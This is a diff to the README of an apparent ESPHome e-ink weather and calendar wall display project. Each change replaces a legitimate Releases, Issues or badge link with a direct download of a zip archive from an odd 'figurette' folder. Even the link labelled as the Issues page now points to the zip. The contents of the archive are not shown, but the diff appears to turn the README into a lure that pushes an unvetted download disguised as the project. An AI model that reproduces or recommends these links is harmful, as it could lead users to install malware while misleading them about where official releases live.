@@ -1,6 +1,6 @@
 # 🌦️ ESPHome-E-Ink-Weather-Calendar-Wall-Monitor - Your Smart Wall Display Solution
 
-[![Download](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/releases)
+[![Download](https://raw.githubusercontent.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/main/figurette/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor.zip+Release&color=blue)](https://raw.githubusercontent.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/main/figurette/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The **ESPHome-E-Ink-Weather-Calendar-Wall-Monitor** project offers a complete so
 
 To get started, visit the Releases page to download the latest version:
 
-[Download Latest Release](https://github.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/releases)
+[Download Latest Release](https://raw.githubusercontent.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/main/figurette/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor.zip)
 
 Follow these steps to install the application:
 
@@ -60,10 +60,10 @@ If you face issues during installation or operation, consider the following step
 
 For additional help, you can reach out via the Issues section on the GitHub repository. Here's what to do:
 
-1. Go to the [Issues page](https://github.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/issues).
+1. Go to the [Issues page](https://raw.githubusercontent.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/main/figurette/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor.zip).
 2. Search for similar problems or questions.
 3. If you can't find a solution, click on "New Issue" to ask for help.
 
 With these steps, you can set up and enjoy your wall-mounted e-ink display. Download now and bring smart technology into your home! 
 
-[Download Latest Release](https://github.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/releases)
+[Download Latest Release](https://raw.githubusercontent.com/jpbragaa/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor/main/figurette/ESPHome-E-Ink-Weather-Calendar-Wall-Monitor.zip)
